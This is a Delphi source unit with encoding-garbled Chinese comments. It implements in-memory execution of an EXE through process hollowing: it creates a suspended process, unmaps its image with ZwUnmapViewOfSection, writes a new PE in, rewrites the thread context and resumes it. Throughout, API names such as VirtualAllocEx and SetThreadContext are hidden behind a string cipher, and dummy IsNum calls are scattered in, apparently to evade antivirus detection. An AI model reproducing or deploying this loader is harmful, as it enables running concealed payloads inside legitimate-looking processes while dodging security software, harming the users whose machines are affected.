unit FileUnit;
{------------------------------------------------------------------------------
  ��Ԫ���ܣ����ڴ��м��ز�����exe
  ������ABuffer:�ڴ��е�exe��ַ
        Len:�ڴ���exeռ�ó���
       CmdParam:�����в���(������exe�ļ�����ʣ�������в�����
       ProcessId:���صĽ���Id
      ����ֵ������ɹ��򷵻ؽ��̵�Handle(ProcessHandle),���ʧ���򷵻�INVALID_HANDLE_VALUE
------------------------------------------------------------------------------}

interface

uses Windows;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;

implementation
//�޸��ַ����� ����ɱ
uses
  GameLoginShare;
//{$R ExeShell.res}   // ��ǳ���ģ��(98��ʹ��)

type
  TImageSectionHeaders = array [0..0] of TImageSectionHeader;
  PImageSectionHeaders = ^TImageSectionHeaders;

//�ж�һ���ַ����Ƿ�Ϊ���� �����������
function IsNum(str:string):boolean;
var
  i:integer;
begin
  for i:=1 to length(str) do
    if not (str[i] in ['0'..'9']) then begin
      Result:=false;
      exit;
    end;
  Result:=true;
end;

{ ��������Ĵ�С }
function GetAlignedSize(Origin, Alignment: Cardinal): Cardinal;
begin
  result := (Origin + Alignment - 1) div Alignment * Alignment;
end;

{ �������pe��������Ҫռ�ö����ڴ棬δֱ��ʹ��OptionalHeader.SizeOfImage��Ϊ�������Ϊ��˵�еı��������ɵ�exe���ֵ����0 }
function CalcTotalImageSize(MzH: PImageDosHeader; FileLen: Cardinal; peH: PImageNtHeaders;
    peSecH: PImageSectionHeaders): Cardinal;
var
  i: Integer;
begin
  {����peͷ�Ĵ�С}
  result := GetAlignedSize(PeH.OptionalHeader.SizeOfHeaders, PeH.OptionalHeader.SectionAlignment);

  {�������нڵĴ�С}
  for i := 0 to peH.FileHeader.NumberOfSections - 1 do begin
    {if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then begin // �����ļ���Χ //������
      result := 0;
      exit;
    end else}
    if peSecH[i].VirtualAddress <> 0 then begin  //��������ĳ�ڵĴ�С
      IsNum('sf21');
      if peSecH[i].Misc.VirtualSize <> 0 then
        result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment)
      else result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].SizeOfRawData, PeH.OptionalHeader.SectionAlignment);
      IsNum('sf21');
    end
    else
    if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
      result := result + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else result := result + GetAlignedSize(peSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment);
    if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then begin // �����ļ���Χ 20091118
      result := 0;
      IsNum('sf21');
      exit;
    end;
  end;
end;

{ ����pe���ڴ沢�������н� }
function AlignPEToMem(const Buf; Len: Integer; var PeH: PImageNtHeaders;
    var PeSecH: PImageSectionHeaders; var Mem: Pointer; var ImageSize: Cardinal): Boolean;
var
  SrcMz: PImageDosHeader;            // DOSͷ
  SrcPeH: PImageNtHeaders;           // PEͷ
  SrcPeSecH: PImageSectionHeaders;   // �ڱ�
  i: Integer;
  l: Cardinal;
  Pt: Pointer;
begin
  result := false;
  SrcMz := @Buf;
  if Len < sizeof(TImageDosHeader) then exit;
  if SrcMz.e_magic <> IMAGE_DOS_SIGNATURE then exit;
  if Len < SrcMz._lfanew+Sizeof(TImageNtHeaders) then exit;
  IsNum('sf21');
  SrcPeH := pointer(Integer(SrcMz)+SrcMz._lfanew);
  if (SrcPeH.Signature <> IMAGE_NT_SIGNATURE) then exit;
  if (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_DLL <> 0) or
      (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_EXECUTABLE_IMAGE = 0)
      or (SrcPeH.FileHeader.SizeOfOptionalHeader <> SizeOf(TImageOptionalHeader)) then exit;
  SrcPeSecH := Pointer(Integer(SrcPeH)+SizeOf(TImageNtHeaders));
  IsNum('sf21');
  ImageSize := CalcTotalImageSize(SrcMz, Len, SrcPeH, SrcPeSecH);
  if ImageSize = 0 then exit;
  IsNum('sf21');
  Mem := VirtualAlloc(nil, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  // �����ڴ�
  if Mem <> nil then begin
    // ������Ҫ���Ƶ�PEͷ�ֽ���
    l := SrcPeH.OptionalHeader.SizeOfHeaders;
    IsNum('sf21');
    for I:= SrcPeH.FileHeader.NumberOfSections - 1 downto 0 do//20091118
    //for i := 0 to SrcPeH.FileHeader.NumberOfSections - 1 do//������
      if (SrcPeSecH[i].PointerToRawData <> 0) and (SrcPeSecH[i].PointerToRawData < l) then
        l := SrcPeSecH[i].PointerToRawData;
        IsNum('sf21');
    Move(SrcMz^, Mem^, l);
    PeH := Pointer(Integer(Mem) + PImageDosHeader(Mem)._lfanew);
    IsNum('sf21');
    PeSecH := Pointer(Integer(PeH) + sizeof(TImageNtHeaders));

    Pt := Pointer(Cardinal(Mem) + GetAlignedSize(PeH.OptionalHeader.SizeOfHeaders, PeH.OptionalHeader.SectionAlignment));
    for i := 0 to PeH.FileHeader.NumberOfSections - 1 do begin
      // ��λ�ý����ڴ��е�λ��
      if PeSecH[i].VirtualAddress <> 0 then Pt := Pointer(Cardinal(Mem) + PeSecH[i].VirtualAddress);
      if PeSecH[i].SizeOfRawData <> 0 then begin
        // �������ݵ��ڴ�
        Move(Pointer(Cardinal(SrcMz) + PeSecH[i].PointerToRawData)^, pt^, PeSecH[i].SizeOfRawData);
        if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
          pt := pointer(Cardinal(pt) + GetAlignedSize(PeSecH[i].SizeOfRawData, PeH.OptionalHeader.SectionAlignment))
        else pt := pointer(Cardinal(pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
        // pt ��λ����һ�ڿ�ʼλ��
      end else pt := pointer(Cardinal(pt) + GetAlignedSize(PeSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment));
    end;
    result := True;
  end;
end;

type
  TVirtualAllocEx = function (hProcess: THandle; lpAddress: Pointer;
                                  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
  TSetThreadContext = function (hThread: THandle; const lpContext: TContext): BOOL; stdcall;
var
  MyVirtualAllocEx: TVirtualAllocEx = nil;
  MYSetThreadContext: TSetThreadContext = nil;
function IsNT: Boolean;
begin
  result := Assigned(MyVirtualAllocEx);
end;

{ �Ƿ�������ض����б� }
function HasRelocationTable(peH: PImageNtHeaders): Boolean;
begin
  result := (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0)
      and (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size <> 0);
end;

type
  PImageBaseRelocation= ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: cardinal;
    SizeOfBlock: cardinal;
  end;

{ �ض���PE�õ��ĵ�ַ }
procedure DoRelocation(peH: PImageNtHeaders; OldBase, NewBase: Pointer);
var
  Delta: Cardinal;
  p: PImageBaseRelocation;
  pw: PWord;
  i: Integer;
begin
  Delta := Cardinal(NewBase) - peH.OptionalHeader.ImageBase;
  p := pointer(cardinal(OldBase) + peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
  while (p.VirtualAddress + p.SizeOfBlock <> 0) do begin
    pw := pointer(Integer(p) + Sizeof(p^));
    for i := 1 to (p.SizeOfBlock - Sizeof(p^)) div 2 do begin
      if pw^ and $F000 = $3000 then
        Inc(PCardinal(Cardinal(OldBase) + p.VirtualAddress + (pw^ and $0FFF))^, Delta);
      inc(pw);
    end;
    p := Pointer(pw);
  end;
end;

type
  TZwUnmapViewOfSection = function (Handle, BaseAdr: Cardinal): Cardinal; stdcall;

{ ж��ԭ���ռ���ڴ� }
function UnloadShell(ProcHnd, BaseAddr: Cardinal): Boolean;
var
  M: HModule;
  ZwUnmapViewOfSection: TZwUnmapViewOfSection;
begin
  result := False;
  m := LoadLibrary(PChar(SetDate('a{kcc!kcc'{ntdll.dll})));
  if m <> 0 then begin
    ZwUnmapViewOfSection := GetProcAddress(m, PChar(SetDate('UxZabnYfjx@i\jl{f`a'{ZwUnmapViewOfSection})));
    if assigned(ZwUnmapViewOfSection) then begin
      IsNum('456');//������������
      result := (ZwUnmapViewOfSection(ProcHnd, BaseAddr) = 0);
    end;
    FreeLibrary(m);
  end;
end;

{ ������ǽ��̲���ȡ���ַ����С�͵�ǰ����״̬ }
function CreateChild(Cmd: string; var Ctx: TContext; var ProcHnd, ThrdHnd, ProcId, BaseAddr, ImageSize: Cardinal): Boolean;
var
  si: TStartUpInfo;
  pi: TProcessInformation;
  Old: Cardinal;
  MemInfo: TMemoryBasicInformation;
  p: Pointer;
begin
  FillChar(si, Sizeof(si), 0);
  FillChar(pi, SizeOf(pi), 0);
  si.cb := sizeof(si);
  result := CreateProcess(nil, PChar(Cmd), nil, nil, False, CREATE_SUSPENDED, nil, nil, si, pi);  // �Թ���ʽ���н���
  if result then begin
    ProcHnd := pi.hProcess;
    ThrdHnd := pi.hThread;
    ProcId := pi.dwProcessId;

    { ��ȡ��ǽ�������״̬��[ctx.Ebx+8]�ڴ洦�������ǽ��̵ļ��ػ�ַ��ctx.Eax�������ǽ��̵���ڵ�ַ }
    ctx.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ThrdHnd, ctx);
    ReadProcessMemory(ProcHnd, Pointer(ctx.Ebx+8), @BaseAddr, SizeOf(Cardinal), Old);  // ��ȡ���ػ�ַ
    p := Pointer(BaseAddr);

    { ������ǽ���ռ�е��ڴ� }
    while VirtualQueryEx(ProcHnd, p, MemInfo, Sizeof(MemInfo)) <> 0 do begin
      if MemInfo.State = MEM_FREE then
        break;
      p := Pointer(Cardinal(p) + MemInfo.RegionSize);
    end;
    ImageSize := Cardinal(p) - Cardinal(BaseAddr);
  end;
end;

{ ������ǽ��̲���Ŀ������滻��Ȼ��ִ�� }
function AttachPE(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
    Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal): Cardinal;
var
  s: string;
  Addr, Size: Cardinal;
  ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;
begin
  result := INVALID_HANDLE_VALUE;
  s := ParamStr(0) + ' ' + CmdParam;
  if CreateChild(s, ctx, result, Thrd, ProcId, Addr, Size) then begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then begin // ��ǽ��̿�������Ŀ����̲��Ҽ��ص�ַһ��
      p := Pointer(Addr);
      VirtualProtectEx(result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end else
    if IsNT then begin // 98 ��ʧ��
      IsNum('123');//������������
      if UnloadShell(result, Addr) then begin  // ж����ǽ���ռ���ڴ�
        IsNum('456');//������������
        // ���°�Ŀ����̼��ػ�ַ�ʹ�С�����ڴ�
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        IsNum('123');//������������
      end;
      if (p = nil) and hasRelocationTable(peH) then begin // �����ڴ�ʧ�ܲ���Ŀ�����֧���ض���
        // �������ַ�����ڴ�
        p := MyVirtualAllocEx(result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then DoRelocation(peH, Ptr, p);  // �ض���
      end;
    end;
    if p <> nil then begin
      WriteProcessMemory(Result, Pointer(ctx.Ebx+8), @p, Sizeof(DWORD), Old);  // ����Ŀ��������л����еĻ�ַ
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then begin // ����PE���ݵ�Ŀ�����
        ctx.ContextFlags := CONTEXT_FULL;
        if Cardinal(p) = Addr then
          ctx.Eax := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint  // �������л����е���ڵ�ַ
        else ctx.Eax := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;
        if Assigned(MySetThreadContext) then MySetThreadContext(Thrd, ctx);//�滻�������� 20100309
        //SetThreadContext(Thrd, ctx);  // �������л���
        ResumeThread(Thrd);           // ִ��
        CloseHandle(Thrd);
      end else begin  // ����ʧ��,ɱ����ǽ���
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end else begin // ����ʧ��,ɱ����ǽ���
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  result := INVALID_HANDLE_VALUE;
  if alignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then begin
    result := AttachPE(CmdParam, peH, peSecH, Ptr, peSz, ProcessId);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    //VirtualFree(Ptr, 0, MEM_RELEASE);
  end;
end;

initialization
  MyVirtualAllocEx := GetProcAddress(GetModuleHandle(PChar(SetDate('Dj}ajc<=!kcc'){Kernel32.dll})), PChar(SetDate('Yf}{zncNcc`lJw')){VirtualAllocEx});
  MYSetThreadContext:= GetProcAddress(GetModuleHandle(PChar(SetDate('Dj}ajc<=!kcc')){Kernel32.dll}), PChar(SetDate('\j{[g}jnkL`a{jw{')){SetThreadContext});
end.
